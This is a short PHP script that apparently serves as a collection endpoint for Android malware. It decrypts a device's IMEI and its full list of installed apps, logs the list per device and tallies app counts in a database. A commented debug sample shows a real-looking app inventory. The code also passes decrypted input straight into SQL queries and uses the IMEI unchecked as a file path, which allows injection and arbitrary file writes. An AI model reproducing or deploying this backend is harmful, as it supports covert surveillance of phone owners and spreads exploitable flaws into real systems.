<?php  
include 'crypt.php';
include 'db.php';

$request = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
$request = mb_substr($request, 0, mb_strlen($request));
$request = decrypt($request,cryptKey);

#debug 
#$request = "123123123123|;com.google.android.youtube;com.google.android.googlequicksearchbox;com.king.candycrushsodasaga;com.whatsapp;com.prettysimple.criminalcaseandroid;com.sec.android.app.samsungapps;com.outfit7.mytalkingtomfree;com.android.vending;com.samsung.android.email.ui;com.teknolojimuhendisi.tarifler;com.android.contacts;com.android.mms;com.android.stk;com.akilliuygulamalar.kekvekurabiyetarifleri;com.samsung.android.app.memo;com.google.android.gm;com.android.calendar;com.microsoft.office.outlook;com.sec.android.gallery3d;com.sec.android.app.music;com.google.android.apps.docs;com.google.android.apps.maps;com.sec.android.app.clockpackage;com.samsung.android.sm;com.google.android.gms;com.google.android.videos;com.sec.android.app.myfiles;tr.Pastatarifleri.Turkiye;com.kariyer.androidproject;com.google.android.apps.photos;com.sec.android.app.sbrowser;com.facebook.katana;com.sec.android.app.popupcalculator;com.android.settings;com.meb.vbsmobil;netix.com.ninniler;oops.speedmeterandlantern2;com.sec.android.app.fm;com.sec.android.app.camera;com.google.android.androidforwork;com.sec.android.app.voicerecorder;com.outfit7.mytalkingangelafree;com.samsung.android.video;";

$massivReq = explode("|", $request);
$IMEI = $massivReq[0]; 
$text_log = $massivReq[1];

$apps = explode(";", $massivReq[1]);
$safe_dir = "logs/apps/";

function checkApp($app_name='', $mysqli){
	$search_app_sql = "SELECT * FROM `stat_apps` WHERE `app_name` LIKE '$app_name'";
	$search_app_sql_res = $mysqli->query($search_app_sql);
	

	if ($search_app_sql_res->num_rows){
		$increment_count_sql = "UPDATE `stat_apps` SET `count` = `count` + 1 WHERE `app_name` = '$app_name'";
		
		$increment_count_sql_res = $mysqli->query($increment_count_sql);
	} else {
		$insert_new_app = "INSERT INTO `stat_apps` (`id`, `app_name`, `count`) VALUES (NULL, '$app_name', '1');";
		$insert_new_app_res = $mysqli->query($insert_new_app);
	}
}

if(($IMEI != "") && ($text_log != "")){
	$data = '';
	foreach ($apps as $app) {
		if (($app != "") and ($app != " ")) {
			$data .= "$app\n";
			checkApp($app, $mysqli);
		}
	}
	file_put_contents("$safe_dir$IMEI.log", $data);
}
?>